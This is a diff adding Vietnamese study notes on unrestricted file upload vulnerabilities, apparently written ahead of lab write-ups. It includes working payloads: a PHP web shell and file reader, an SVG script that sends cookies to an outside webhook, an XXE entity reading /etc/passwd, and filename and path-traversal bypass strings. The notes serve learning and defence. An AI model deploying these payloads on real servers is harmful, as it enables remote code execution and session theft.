@@ -1,3 +1,124 @@
+<img width="837" height="376" alt="image" src="https://github.com/user-attachments/assets/ecb87cc9-b108-4369-9a6c-e3f9186216bd" />
+
+# Lỗ hổng Unrestricted File Upload
+## 1. Đĩnh nghĩa
+\- Đây là lỗi xuất phát từ phía Server
+
+\- Là lỗ hổng xảy ra khi một ứng dụng web cho phép người dùng tải file lên hệ thống nhưng không xác thực chặt chẽ các tiêu chí của file như tên, định dạng (type), nội dung hoặc kích thước
+
+## 2.Nguyên nhân, vị trí lỗi
+\- Nguyên nhân gốc rễ: 
+- Lỗ hổng bắt nguồn từ việc hệ thống quá tin tưởng vào dữ liệu đầu vào do người dùng cung cấp
+- Máy chủ thiếu các cơ chế kiểm duyệt và rào chắn an toàn ở tầng backend đối với file được tải lên. Việc chỉ kiểm tra định dạng file ở phía client là không đủ vì kẻ tấn công có thể dễ dàng can thiệp và thay đổi request trước khi gửi đi
+
+\- Vị trí lỗi: 
+- Hệ thống lưu file trực tiếp vào filesystem và cấp quyền truy cập (read/execute) thông qua URL/CDN tạo điều kiện cho RCE
+- Lỗi không chỉ nằm ở code application mà còn ở cấu hình máy chủ. Server được cấu hình cho phép thực thi các script (PHP, ASPX, JSP...) ngay trong thư mục chứa file upload
+
+## 3.Hậu quả, tác hại
+### a. Remote Code Execution 
+
+\- Đây là hậu quả nghiêm trọng nhất. Nếu bạn upload thành công một webshell và server thực thi nó, ta có thể thao tác, truy xuất bất kì dữ liệu nào của web
+
+\- Cơ chế: Tải lên các script như .php, .aspx, .jsp chứa mã độc, ví dụ:
+
+```
+<?php system($_REQUEST['cmd']); ?>
+
+<?php echo file_get_contents('/etc/passwd'); ?>
+```
+
+\- **Hậu quả:** 
+- Ta có thể thao tác, truy xuất bất kì dữ liệu nào của website
+- Kiểm soát hoàn toàn: Thực thi lệnh hệ thống dưới quyền của user đang chạy web server
+
+&rarr; Làm bàn đạp (pivot) dẫn đến leo thang đặc quyền: Từ user web, kẻ tấn công tìm lỗ hổng trong OS để chiếm quyền root/admin
+
+### 2. Cross-Site Scripting & XML External Entity 
+\-  File Upload là một con đường cực kỳ nhanh và tinh vi để thực hiện Stored XSS và XXE mà ít khi server validate (do thường chú tâm hơn đến các file thực thi webshell khác)
+
+Cơ chế: Tải lên file .html hoặc .svg có chứa mã JavaScript
+```
+<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://webhook.com/log?c='+btoa(document.cookie))</script></svg>
+
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+
+<img src=x onerror=alert(document.origin)>
+```
+
+\- **Hậu quả:** 
+- Đánh cắp cookie, session token của người dùng để đăng nhập trái phép
+
+- Phát tán mã độc: Chỉnh sửa nội dung trang web hiển thị với nạn nhân để thực hiện phishing, keylogging
+
+### 3. Denial of Service (DoS) 
+
+\- Tấn công vào tài nguyên phần cứng của server khiến dịch vụ không thể phục vụ người dùng hợp lệ
+
+\- Cơ chế: Upload liên tục các file có dung lượng cực lớn để làm đầy ổ cứng, cạn kiệt tài nguyên
+- Image Bomb (Pixel Flood): Upload một bức ảnh có kích thước pixel khổng lồ nhưng dung lượng nén nhỏ. Khi server cố gắng giải nén ảnh để xử lý (tạo thumbnail), nó sẽ ngốn sạch RAM và CPU, gây treo máy
+- Ghi đè file hệ thống: Nếu server có lỗi Path Traversal, kẻ tấn công có thể upload file đè lên các file cấu hình quan trọng, khiến ứng dụng ngừng hoạt động
+
+## 4. Các dạng filter thường gặp và cách bypass
+### Kiểm duyệt file extension
+\- Server hay các cơ chế 
+- Blacklist, từ chối các đuôi file như .php, .phtml, .php5, .pht...
+- Whitelist, chỉ cho phép đuôi file nhất định như .png, .jpg,... mới có thể thực hiện tải file
+
+\- Bypass:
+- Sử dụng obfuscate file extension: `shell.jpg.php`, `shell.php.jpg`
+- Null bytes: `shell.php%00.jpg`, `shell.phtml%00.png`
+- Bất đồng bộ giữa bộ lọc kiểm duyệt và cách webserver xử lý file: `shell.php.`, `shell.php  .`, `shell.aspx;.png`
+
+### Kiểm duyệt Metadata và nội dung
+#### Kiểm duyệt MIME Type (Content-Type header)
+\- Nếu hệ thống quá tin tưởng vào Header do phía client gửi lên, nó có thể bị sửa đổi mà không phản ánh đúng bản chất thực sự của file
+
+\- Gửi request với Content-Type như `text/html` hoặc `application/svg+xml` &rarr; HTML Injection
+
+#### Kiểm duyệt File Signature 
+\- Lỗ hổng: Nếu server chỉ kiểm tra vài byte đầu mà không quét toàn bộ nội dung, kẻ tấn công có thể chèn mã độc vào phía sau các byte "hợp lệ" đó
+
+\- Cơ chế: Server đọc magic bytes của file để xác định định dạng thực tế, ví dụ: 
+- File JPEG luôn bắt đầu bằng `FF D8 FF`
+- File PNG là `89 50 4E 47`
+- File GIF là `GIF89a` (rất hay sử dụng để bypass filter)
+
+### Cách khai thác
+\- Tạo một polygot (một file chứa nhiều định dạng) PHP-JPG bằng Exiftool
+
+\- Nếu server thực thi phần mã chứa trong metadata của ảnh &rarr; RCE
+
+$\implies$ Bypass được cả kiểm duyệt filename, file extension, Magic Bytes và Content-check
+  - Phụ thuộc vào cấu hình của server khi cho phép xử lí ảnh như một script
+
+### 4.3. Kiểm duyệt Logic và Cấu trúc file
+#### Kiểm tra kích thước:
+
+\- Cơ chế: Giới hạn dung lượng tối đa của file tải lên để tránh tràn bộ nhớ ổ cứng, nhưng cũng đủ dung lượng nhất định để xác định đây là file thật
+
+\- Lỗ hổng: Thiếu giới hạn này dẫn đến tấn công DoS (làm cạn kiệt tài nguyên)
+
+#### Kiểm tra thông số kỹ thuật (Image Dimensions):
+
+\- Cơ chế: Sử dụng các thư viện xử lý ảnh để kiểm tra chiều rộng/cao của ảnh
+
+\- Lỗ hổng: Lỗ hổng nằm ở chính các thư viện xử lý ảnh (như ImageMagick). Khi server cố gắng "đọc" thông số ảnh, nếu thư viện đó dính lỗi (như XXE hay RCE), server sẽ bị chiếm quyền điều khiển ngay lập tức
+
+### 4.4 Kiểm duyệt tên file (Filename Sanitization)
+\- Cơ chế: Lọc bỏ các ký tự đặc biệt (/, \, .., \0) để đảm bảo file được lưu đúng thư mục, đúng định dạng quy định
+
+\- Lỗ hổng: Thiếu bước này dẫn đến Path Traversal, cho phép file bị đẩy vào các vị trí nhạy cảm có thể thực thi script hoặc ghi đè lên các file cấu hình quan trọng của hệ thống
+
+\- Bypass: Tận dụng kĩ thuật bypass Path Traversal
+- `%2f` &rarr; `/`
+- `....//` &rarr; `../`
+
+### 4.5 Lưu tạm file trên hệ thống trước khi validate
+\- Cách này tạo khoảng trống cho Race condition (Lab cuối), chỉ một tích tắc file tồn tại trên web cũng có thể dẫn đến lỗ hổng nghiêm trọng
+
+
+
 # Lab 01
 
 <img width="1059" height="408" alt="image" src="https://github.com/user-attachments/assets/f9926029-18bc-4ccc-98a3-bd5e5f18ba9d" />
